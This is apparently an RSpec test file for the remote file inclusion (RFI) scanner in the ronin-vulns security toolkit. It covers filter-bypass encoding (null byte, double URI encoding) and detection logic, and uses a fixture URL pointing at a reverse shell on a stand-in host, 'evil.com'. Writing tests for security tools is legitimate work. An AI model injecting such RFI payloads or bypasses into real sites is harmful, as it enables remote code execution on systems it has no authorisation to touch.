require 'spec_helper'
require 'web_vuln_examples'
require 'ronin/vulns/rfi'

require 'webmock/rspec'

describe Ronin::Vulns::RFI do
  describe "TEST_SCRIPT_URL" do
    subject { described_class::TEST_SCRIPT_URL }

    it "must equal 'https://raw.githubusercontent.com/ronin-rb/ronin-vulns/\#{VERSION}/data/rfi_test.php'" do
      expect(subject).to eq("https://raw.githubusercontent.com/ronin-rb/ronin-vulns/#{Ronin::Vulns::VERSION}/data/rfi_test.php")
    end

    it "must be a publically accessible URL", :network do
      response = Net::HTTP.get_response(URI(subject))

      expect(response.code.to_i).to eq(200)
      expect(response.body).to_not be_empty
    end
  end

  describe ".test_script_url" do
    subject { described_class }

    it "must have a default test_script URL" do
      expect(subject.test_script_url).to eq(described_class::TEST_SCRIPT_URL)
    end
  end

  describe ".test_script_url=" do
    subject { described_class }

    let(:new_url) { 'http://www.example.com/test.php' }

    before do
      subject.test_script_url = new_url
    end

    it "must set .test_script_url URL" do
      expect(subject.test_script_url).to eq(new_url)
    end

    after { subject.test_script_url = described_class::TEST_SCRIPT_URL }
  end

  let(:query_param) { 'bar' }
  let(:url)         { "https://example.com/page?foo=1&bar=2&baz=3" }

  subject { described_class.new(url, query_param: query_param) }

  describe "#initialize" do
    include_examples "Ronin::Vulns::Web#initialize examples"

    it "must default #test_script_url to TEST_SCRIPT_URL" do
      expect(subject.test_script_url).to eq(described_class::TEST_SCRIPT_URL)
    end

    it "must default #filter_bypass to nil" do
      expect(subject.filter_bypass).to be(nil)
    end

    context "when given the test_script_url: keyword argument" do
      let(:test_script_url) { 'https://example.com/alternate/test_script.php' }

      subject do
        described_class.new(url, query_param:     query_param,
                                 test_script_url: test_script_url)
      end

      it "must set #test_script_url" do
        expect(subject.test_script_url).to eq(test_script_url)
      end
    end

    context "when given the filter_bypass: keyword argument" do
      let(:filter_bypass) { :null_byte }

      subject do
        described_class.new(url, query_param:   query_param,
                                 filter_bypass: filter_bypass)
      end

      it "must set #filter_bypass" do
        expect(subject.filter_bypass).to eq(filter_bypass)
      end
    end
  end

  let(:rfi_url) { 'http://evil.com/reverse_shell.php' }

  describe "#encode_payload" do
    let(:uri_escaped_rfi_url) { URI::QueryParams.escape(rfi_url) }

    it "must return the unencoded RFI URL as a String by default" do
      expect(subject.encode_payload(rfi_url)).to eq(rfi_url)
    end

    context "when #filter_bypass is :null_byte" do
      subject do
        described_class.new(url, query_param:   query_param,
                                 filter_bypass: :null_byte)
      end

      it "must append %00 to the RFI URL" do
        expect(subject.encode_payload(rfi_url)).to eq("#{rfi_url}\0")
      end
    end

    context "when #filter_bypass is :double_encode" do
      subject do
        described_class.new(url, query_param:   query_param,
                                 filter_bypass: :double_encode)
      end

      let(:double_uri_escaped_rfi_url) do
        URI::QueryParams.escape(rfi_url)
      end

      it "must URI escape the RFI URL twice" do
        expect(subject.encode_payload(rfi_url)).to eq(double_uri_escaped_rfi_url)
      end
    end
  end

  describe "#exploit" do
    let(:payload) { subject.encode_payload(rfi_url) }

    include_examples "Ronin::Vulns::Web#exploit examples"
  end

  describe "#vulnerable?" do
    let(:request_url) { subject.exploit_url(subject.test_script_url) }
    let(:response_body) do
      <<~HTML
        <html>
          <body>
            <p>example content</p>
            <p>included content</p>
            <p>more content</p>
          </body>
        </html>
      HTML
    end
    let(:response) { double('Net::HTTPResponse', body: response_body) }

    before do
      expect(subject).to receive(:exploit).with(subject.test_script_url).and_return(response)
    end

    it "must call #exploit with #test_script_url" do
      subject.vulnerable?
    end

    context "when the response body contains 'Remote File Inclusion (RFI) Detected: eval(\"1 + 1\") = 2'" do
      let(:response_body) do
        <<~HTML
          <html>
            <body>
              <p>example content</p>
              Remote File Inclusion (RFI) Detected: eval("1 + 1") = 2
              <p>more content</p>
            </body>
          </html>
        HTML
      end

      it "must return true" do
        expect(subject.vulnerable?).to be(true)
      end
    end

    context "when the response body does not contain 'Remote File Inclusion (RFI) Detected: eval(\"1 + 1\") = 2'" do
      it "must return false" do
        expect(subject.vulnerable?).to be(false)
      end
    end
  end
end
